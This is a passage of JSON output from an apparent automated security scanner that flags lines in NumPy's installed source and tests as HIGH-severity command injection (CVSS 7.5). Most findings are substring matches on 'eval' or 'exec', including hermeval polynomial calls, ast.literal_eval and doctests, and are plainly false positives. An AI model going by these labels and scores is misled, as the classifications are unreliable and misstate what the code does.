            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2964,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def param_eval(v, g_params, params, dimspec=None):",
            "context": "analyzeargs_re_1 = re.compile(r'\\A[a-z]+[\\w$]*\\Z', re.I)\n\n\ndef param_eval(v, g_params, params, dimspec=None):\n    \"\"\"\n    Creates a dictionary of indices and values for each parameter in a\n    parameter array to be evaluated later.",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2985,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "p = eval(v, g_params, params)",
            "context": "    \"\"\"\n    if dimspec is None:\n        try:\n            p = eval(v, g_params, params)\n        except Exception as msg:\n            p = v\n            outmess(f'param_eval: got \"{msg}\" on {v!r}\\n')",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 3016,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "item = eval(item, g_params, params)",
            "context": "    v_eval = []\n    for item in v:\n        try:\n            item = eval(item, g_params, params)\n        except Exception as msg:\n            outmess(f'param_eval: got \"{msg}\" on {item!r}\\n')\n        v_eval.append(item)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 3468,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "v = eval(v)",
            "context": "            v = vars[a]['=']\n            if vars[a]['typespec'] in ['complex', 'double complex']:\n                try:\n                    v = eval(v)\n                    v = f'({v.real},{v.imag})'\n                except Exception:\n                    pass",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/capi_maps.py",
            "line": 159,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "d = eval(f.read().lower(), {}, {})",
            "context": "    try:\n        outmess(f'Reading f2cmap from {f2cmap_file!r} ...\\n')\n        with open(f2cmap_file) as f:\n            d = eval(f.read().lower(), {}, {})\n        f2cmap_all, f2cmap_mapped = process_f2cmap_dict(f2cmap_all, d, c2py_map, True)\n        outmess('Successfully applied user defined f2cmap changes\\n')\n    except Exception as msg:",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/capi_maps.py",
            "line": 296,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "ret['size'] = repr(eval(ret['size']))",
            "context": "        dim = copy.copy(var['dimension'])\n        ret['size'] = '*'.join(dim)\n        try:\n            ret['size'] = repr(eval(ret['size']))\n        except Exception:\n            pass\n        ret['dims'] = ','.join(dim)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/capi_maps.py",
            "line": 449,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "v = eval(v, {}, {})",
            "context": "                    ret['init.r'], ret['init.i'] = markoutercomma(\n                        v[1:-1]).split('@,@')\n                else:\n                    v = eval(v, {}, {})\n                    ret['init.r'], ret['init.i'] = str(v.real), str(v.imag)\n            except Exception:\n                raise ValueError(",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/_internal.py",
            "line": 205,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "newitem = (dtype, ast.literal_eval(repeats))",
            "context": "                    'is deprecated; pass either a single number or indicate '\n                    'a tuple with a comma, like \"(2,)\".', DeprecationWarning,\n                    stacklevel=2)\n            newitem = (dtype, ast.literal_eval(repeats))\n\n        result.append(newitem)\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/arrayprint.py",
            "line": 1564,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> assert eval(dtype_short_repr(dt)) == dt",
            "context": "\n    >>> from numpy import *\n    >>> dt = np.int64([1, 2]).dtype\n    >>> assert eval(dtype_short_repr(dt)) == dt\n    \"\"\"\n    if type(dtype).__repr__ != np.dtype.__repr__:\n        # TODO: Custom repr for user DTypes, logic should likely move.",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 84,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "val1 = herme.hermeval(self.x, pol1)",
            "context": "        # check values of result\n        for i in range(5):\n            pol1 = [0] * i + [1]\n            val1 = herme.hermeval(self.x, pol1)\n            for j in range(5):\n                msg = f\"At i={i}, j={j}\"\n                pol2 = [0] * j + [1]",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 88,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "val2 = herme.hermeval(self.x, pol2)",
            "context": "            for j in range(5):\n                msg = f\"At i={i}, j={j}\"\n                pol2 = [0] * j + [1]\n                val2 = herme.hermeval(self.x, pol2)\n                pol3 = herme.hermemul(pol1, pol2)\n                val3 = herme.hermeval(self.x, pol3)\n                assert_(len(pol3) == i + j + 1, msg)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 90,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "val3 = herme.hermeval(self.x, pol3)",
            "context": "                pol2 = [0] * j + [1]\n                val2 = herme.hermeval(self.x, pol2)\n                pol3 = herme.hermemul(pol1, pol2)\n                val3 = herme.hermeval(self.x, pol3)\n                assert_(len(pol3) == i + j + 1, msg)\n                assert_almost_equal(val3, val1 * val2, err_msg=msg)\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 125,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_hermeval(self):",
            "context": "    x = np.random.random((3, 5)) * 2 - 1\n    y = polyval(x, [1., 2., 3.])\n\n    def test_hermeval(self):\n        # check empty input\n        assert_equal(herme.hermeval([], [1]).size, 0)\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 127,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_equal(herme.hermeval([], [1]).size, 0)",
            "context": "\n    def test_hermeval(self):\n        # check empty input\n        assert_equal(herme.hermeval([], [1]).size, 0)\n\n        # check normal input)\n        x = np.linspace(-1, 1)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 135,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = herme.hermeval(x, [0] * i + [1])",
            "context": "        for i in range(10):\n            msg = f\"At i={i}\"\n            tgt = y[i]\n            res = herme.hermeval(x, [0] * i + [1])\n            assert_almost_equal(res, tgt, err_msg=msg)\n\n        # check that shape is preserved",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 142,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_equal(herme.hermeval(x, [1]).shape, dims)",
            "context": "        for i in range(3):\n            dims = [2] * i\n            x = np.zeros(dims)\n            assert_equal(herme.hermeval(x, [1]).shape, dims)\n            assert_equal(herme.hermeval(x, [1, 0]).shape, dims)\n            assert_equal(herme.hermeval(x, [1, 0, 0]).shape, dims)\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 143,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_equal(herme.hermeval(x, [1, 0]).shape, dims)",
            "context": "            dims = [2] * i\n            x = np.zeros(dims)\n            assert_equal(herme.hermeval(x, [1]).shape, dims)\n            assert_equal(herme.hermeval(x, [1, 0]).shape, dims)\n            assert_equal(herme.hermeval(x, [1, 0, 0]).shape, dims)\n\n    def test_hermeval2d(self):",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 144,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_equal(herme.hermeval(x, [1, 0, 0]).shape, dims)",
            "context": "            x = np.zeros(dims)\n            assert_equal(herme.hermeval(x, [1]).shape, dims)\n            assert_equal(herme.hermeval(x, [1, 0]).shape, dims)\n            assert_equal(herme.hermeval(x, [1, 0, 0]).shape, dims)\n\n    def test_hermeval2d(self):\n        x1, x2, x3 = self.x",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 242,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(herme.hermeval(-1, hermeint), i)",
            "context": "            pol = [0] * i + [1]\n            hermepol = herme.poly2herme(pol)\n            hermeint = herme.hermeint(hermepol, m=1, k=[i], lbnd=-1)\n            assert_almost_equal(herme.hermeval(-1, hermeint), i)\n\n        # check single integration with integration constant and scaling\n        for i in range(5):",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 363,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(v[..., i], herme.hermeval(x, coef))",
            "context": "        assert_(v.shape == (3, 4))\n        for i in range(4):\n            coef = [0] * i + [1]\n            assert_almost_equal(v[..., i], herme.hermeval(x, coef))\n\n        # check for 2d x\n        x = np.array([[1, 2], [3, 4], [5, 6]])",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 371,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(v[..., i], herme.hermeval(x, coef))",
            "context": "        assert_(v.shape == (3, 2, 4))\n        for i in range(4):\n            coef = [0] * i + [1]\n            assert_almost_equal(v[..., i], herme.hermeval(x, coef))\n\n    def test_hermevander2d(self):\n        # also tests hermeval2d for non-square coefficient array",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 428,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(herme.hermeval(x, coef3), y)",
            "context": "        #\n        coef3 = herme.hermefit(x, y, 3)\n        assert_equal(len(coef3), 4)\n        assert_almost_equal(herme.hermeval(x, coef3), y)\n        coef3 = herme.hermefit(x, y, [0, 1, 2, 3])\n        assert_equal(len(coef3), 4)\n        assert_almost_equal(herme.hermeval(x, coef3), y)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 431,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(herme.hermeval(x, coef3), y)",
            "context": "        assert_almost_equal(herme.hermeval(x, coef3), y)\n        coef3 = herme.hermefit(x, y, [0, 1, 2, 3])\n        assert_equal(len(coef3), 4)\n        assert_almost_equal(herme.hermeval(x, coef3), y)\n        #\n        coef4 = herme.hermefit(x, y, 4)\n        assert_equal(len(coef4), 5)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 435,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(herme.hermeval(x, coef4), y)",
            "context": "        #\n        coef4 = herme.hermefit(x, y, 4)\n        assert_equal(len(coef4), 5)\n        assert_almost_equal(herme.hermeval(x, coef4), y)\n        coef4 = herme.hermefit(x, y, [0, 1, 2, 3, 4])\n        assert_equal(len(coef4), 5)\n        assert_almost_equal(herme.hermeval(x, coef4), y)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 438,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(herme.hermeval(x, coef4), y)",
            "context": "        assert_almost_equal(herme.hermeval(x, coef4), y)\n        coef4 = herme.hermefit(x, y, [0, 1, 2, 3, 4])\n        assert_equal(len(coef4), 5)\n        assert_almost_equal(herme.hermeval(x, coef4), y)\n        # check things still work if deg is not in strict increasing\n        coef4 = herme.hermefit(x, y, [2, 3, 4, 1, 0])\n        assert_equal(len(coef4), 5)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 442,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(herme.hermeval(x, coef4), y)",
            "context": "        # check things still work if deg is not in strict increasing\n        coef4 = herme.hermefit(x, y, [2, 3, 4, 1, 0])\n        assert_equal(len(coef4), 5)\n        assert_almost_equal(herme.hermeval(x, coef4), y)\n        #\n        coef2d = herme.hermefit(x, np.array([y, y]).T, 3)\n        assert_almost_equal(coef2d, np.array([coef3, coef3]).T)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 471,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(herme.hermeval(x, coef1), y)",
            "context": "        x = np.linspace(-1, 1)\n        y = f2(x)\n        coef1 = herme.hermefit(x, y, 4)\n        assert_almost_equal(herme.hermeval(x, coef1), y)\n        coef2 = herme.hermefit(x, y, [0, 2, 4])\n        assert_almost_equal(herme.hermeval(x, coef2), y)\n        assert_almost_equal(coef1, coef2)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 473,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_almost_equal(herme.hermeval(x, coef2), y)",
            "context": "        coef1 = herme.hermefit(x, y, 4)\n        assert_almost_equal(herme.hermeval(x, coef1), y)\n        coef2 = herme.hermefit(x, y, [0, 2, 4])\n        assert_almost_equal(herme.hermeval(x, coef2), y)\n        assert_almost_equal(coef1, coef2)\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/tests/test_hermite_e.py",
            "line": 519,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = herme.hermeval(roots, pol)",
            "context": "        for i in range(1, 5):\n            roots = np.cos(np.linspace(-np.pi, 0, 2 * i + 1)[1::2])\n            pol = herme.hermefromroots(roots)\n            res = herme.hermeval(roots, pol)\n            tgt = 0\n            assert_(len(pol) == i + 1)\n            assert_almost_equal(herme.herme2poly(pol)[-1], 1)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/testing/_private/utils.py",
            "line": 1287,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(astr, dict)",
            "context": "\n\ndef runstring(astr, dict):\n    exec(astr, dict)\n\n\ndef assert_string_equal(actual, desired):",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/testing/_private/utils.py",
            "line": 1573,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, globs, locs)",
            "context": "    elapsed = jiffies()\n    while i < times:\n        i += 1\n        exec(code, globs, locs)\n    elapsed = jiffies() - elapsed\n    return 0.01 * elapsed\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/tests/test_crackfortran.py",
            "line": 263,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "class TestEval(util.F2PyTest):",
            "context": "        assert mod[0][\"vars\"][\"abar\"][\"=\"] == \"bar('abar')\"\n\n\nclass TestEval(util.F2PyTest):\n    def test_eval_scalar(self):\n        eval_scalar = crackfortran._eval_scalar\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/tests/test_crackfortran.py",
            "line": 372,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "ret = crackfortran.param_eval(v, g_params, params, dimspec=dimspec)",
            "context": "        params = {'dp': 8, 'intparamarray': {1: 3, 2: 5},\n                  'nested': {1: 1, 2: 2, 3: 3}}\n        dimspec = '(2)'\n        ret = crackfortran.param_eval(v, g_params, params, dimspec=dimspec)\n        assert ret == {1: 3.14, 2: 4.0}\n\n    def test_param_eval_nonstandard_range(self):",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/tests/test_crackfortran.py",
            "line": 382,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "ret = crackfortran.param_eval(v, g_params, params, dimspec=dimspec)",
            "context": "                \"selected_real_kind\": crackfortran._selected_real_kind_func}\n        params = {}\n        dimspec = '(-1:1)'\n        ret = crackfortran.param_eval(v, g_params, params, dimspec=dimspec)\n        assert ret == {-1: 6, 0: 3, 1: 1}\n\n    def test_param_eval_empty_range(self):",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/tests/test_crackfortran.py",
            "line": 401,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "ret = crackfortran.param_eval(v, g_params, params, dimspec=None)",
            "context": "                \"selected_int_kind\": crackfortran._selected_int_kind_func,\n                \"selected_real_kind\": crackfortran._selected_real_kind_func}\n        params = {}\n        ret = crackfortran.param_eval(v, g_params, params, dimspec=None)\n        assert ret == '3.14_dp'\n\n    def test_param_eval_too_many_dims(self):",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/tests/test_f2py2e.py",
            "line": 847,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_npd_f77exec():",
            "context": "    pass\n\n\ndef test_npd_f77exec():\n    \"\"\"\n    CLI :: -c --f77exec\n    \"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/tests/test_f2py2e.py",
            "line": 855,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_npd_f90exec():",
            "context": "    pass\n\n\ndef test_npd_f90exec():\n    \"\"\"\n    CLI :: -c --f90exec\n    \"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_deprecations.py",
            "line": 354,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.assert_deprecated(lambda: safe_eval(\"None\"))",
            "context": "        from numpy.lib._utils_impl import safe_eval\n        from numpy.lib.tests.test_io import TextIO\n\n        self.assert_deprecated(lambda: safe_eval(\"None\"))\n\n        data_gen = lambda: TextIO('A,B\\n0,1\\n2,3')\n        kwargs = {'delimiter': \",\", 'missing_values': \"N/A\", 'names': True}",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_dtype.py",
            "line": 1065,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_equal(np.dtype(eval(str(dt))), dt)",
            "context": "                         \"'offsets':[0,76800], \"\n                         \"'itemsize':80000, \"\n                         \"'aligned':True}\")\n        assert_equal(np.dtype(eval(str(dt))), dt)\n\n        dt = np.dtype({'names': ['r', 'g', 'b'], 'formats': ['u1', 'u1', 'u1'],\n                        'offsets': [0, 1, 2],",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_umath_accuracy.py",
            "line": 71,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "inval = np.array(str_to_float(data_subset['input'].astype(str), data_subset['type'].astype(str)), dtype=eval(datatype))",
            "context": "                    npfunc = getattr(np, npname)\n                    for datatype in np.unique(data['type']):\n                        data_subset = data[data['type'] == datatype]\n                        inval = np.array(str_to_float(data_subset['input'].astype(str), data_subset['type'].astype(str)), dtype=eval(datatype))\n                        outval = np.array(str_to_float(data_subset['output'].astype(str), data_subset['type'].astype(str)), dtype=eval(datatype))\n                        perm = np.random.permutation(len(inval))\n                        inval = inval[perm]",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_umath_accuracy.py",
            "line": 72,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "outval = np.array(str_to_float(data_subset['output'].astype(str), data_subset['type'].astype(str)), dtype=eval(datatype))",
            "context": "                    for datatype in np.unique(data['type']):\n                        data_subset = data[data['type'] == datatype]\n                        inval = np.array(str_to_float(data_subset['input'].astype(str), data_subset['type'].astype(str)), dtype=eval(datatype))\n                        outval = np.array(str_to_float(data_subset['output'].astype(str), data_subset['type'].astype(str)), dtype=eval(datatype))\n                        perm = np.random.permutation(len(inval))\n                        inval = inval[perm]\n                        outval = outval[perm]",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 244,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "func = eval(intrin)",
            "context": "            npyv_all_##SFX\n        \"\"\"\n        data_a = self._load_b(data * self._nlanes())\n        func = eval(intrin)\n        intrin = getattr(self, intrin)\n        desired = func(data_a)\n        simd = intrin(data_a)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 510,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "func = eval(intrin[:3])",
            "context": "        \"\"\"\n        pinf, ninf, nan = self._pinfinity(), self._ninfinity(), self._nan()\n        chk_nan = {\"xp\": 1, \"np\": 1, \"nn\": 2, \"xn\": 2}.get(intrin[-2:], 0)\n        func = eval(intrin[:3])\n        reduce_intrin = getattr(self, \"reduce_\" + intrin)\n        intrin = getattr(self, intrin)\n        hf_nlanes = self.nlanes // 2",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 640,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "func = eval(intrin)",
            "context": "            npyv_all_##SFX\n        \"\"\"\n        data_a = self.load(data * self.nlanes)\n        func = eval(intrin)\n        intrin = getattr(self, intrin)\n        desired = func(data_a)\n        simd = intrin(data_a)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 701,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "npyv_load_tillz, npyv_load_till = eval(intrin)",
            "context": "    def test_memory_partial_load(self, intrin, elsizes, scale, fill):\n        if self._scalar_size() not in elsizes:\n            return\n        npyv_load_tillz, npyv_load_till = eval(intrin)\n        data = self._data()\n        lanes = list(range(1, self.nlanes + 1))\n        lanes += [self.nlanes**2, self.nlanes**4]  # test out of range",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 721,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "npyv_store_till = eval(intrin)",
            "context": "    def test_memory_partial_store(self, intrin, elsizes, scale):\n        if self._scalar_size() not in elsizes:\n            return\n        npyv_store_till = eval(intrin)\n        data = self._data()\n        data_rev = self._data(reverse=True)\n        vdata = self.load(data)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 741,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "npyv_loadn = eval(intrin)",
            "context": "    def test_memory_noncont_load(self, intrin, elsizes, scale):\n        if self._scalar_size() not in elsizes:\n            return\n        npyv_loadn = eval(intrin)\n        for stride in range(-64, 64):\n            if stride < 0:\n                data = self._data(stride, -stride * self.nlanes)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 767,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "npyv_loadn_tillz, npyv_loadn_till = eval(intrin)",
            "context": "    def test_memory_noncont_partial_load(self, intrin, elsizes, scale, fill):\n        if self._scalar_size() not in elsizes:\n            return\n        npyv_loadn_tillz, npyv_loadn_till = eval(intrin)\n        lanes = list(range(1, self.nlanes + 1))\n        lanes += [self.nlanes**2, self.nlanes**4]\n        for stride in range(-64, 64):",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 804,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "npyv_storen = eval(intrin)",
            "context": "    def test_memory_noncont_store(self, intrin, elsizes, scale):\n        if self._scalar_size() not in elsizes:\n            return\n        npyv_storen = eval(intrin)\n        data = self._data()\n        vdata = self.load(data)\n        hlanes = self.nlanes // scale",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 843,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "npyv_storen_till = eval(intrin)",
            "context": "    def test_memory_noncont_partial_store(self, intrin, elsizes, scale):\n        if self._scalar_size() not in elsizes:\n            return\n        npyv_storen_till = eval(intrin)\n        data = self._data()\n        vdata = self.load(data)\n        lanes = list(range(1, self.nlanes + 1))",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 895,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "intrin = eval(intrin)",
            "context": "        \"\"\"\n        if elsize != self._scalar_size():\n            return\n        intrin = eval(intrin)\n        idx_itrin = getattr(self.npyv, f\"setall_u{elsize}\")\n        table = range(table_size)\n        for i in table:",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_simd.py",
            "line": 1102,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "func = eval(intrin)",
            "context": "            npyv_all_##SFX\n        \"\"\"\n        data_a = self.load(data * self.nlanes)\n        func = eval(intrin)\n        intrin = getattr(self, intrin)\n        desired = func(data_a)\n        simd = intrin(data_a)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_arrayprint.py",
            "line": 340,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_equal(eval(repr(a), vars(np)), a)",
